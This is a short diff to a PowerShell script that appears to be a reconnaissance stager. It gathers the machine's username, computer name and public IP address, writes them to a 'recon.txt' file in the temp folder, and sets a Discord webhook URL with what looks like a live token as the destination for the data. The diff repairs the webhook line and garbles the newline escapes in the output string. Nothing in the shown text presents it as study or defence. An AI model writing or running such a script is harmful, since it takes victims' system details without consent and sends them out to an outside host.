@@ -1,9 +1,9 @@
-$webhookUrl = https://discordapp.com/api/webhooks/1360981550174441498/cxv3RG3NDt_eRobBKo7STK3C-mmx76IS5T8QJ07qZnspV749ZRZ0uLVRGBzzsq_2Rh3v
+$webhookUrl = "https://discordapp.com/api/webhooks/1360981550174441498/cxv3RG3NDt_eRobBKo7STK3C-mmx76IS5T8QJ07qZnspV749ZRZ0uLVRGBzzsq_2Rh3v"
 
 $username = $env:USERNAME
 $computername = $env:COMPUTERNAME
 $ip_adress = Invoke-RestMethod -Uri "https://api.ipify.org"
-$output = "Username: $username `nComputername: $computername`nIPadress: $ip_adress"
+$output = "Username: $username nComputername: $computernamenIPadress: $ip_adress"
 $path = "$env:TEMP\recon.txt"
 
 $output | Out-File $path
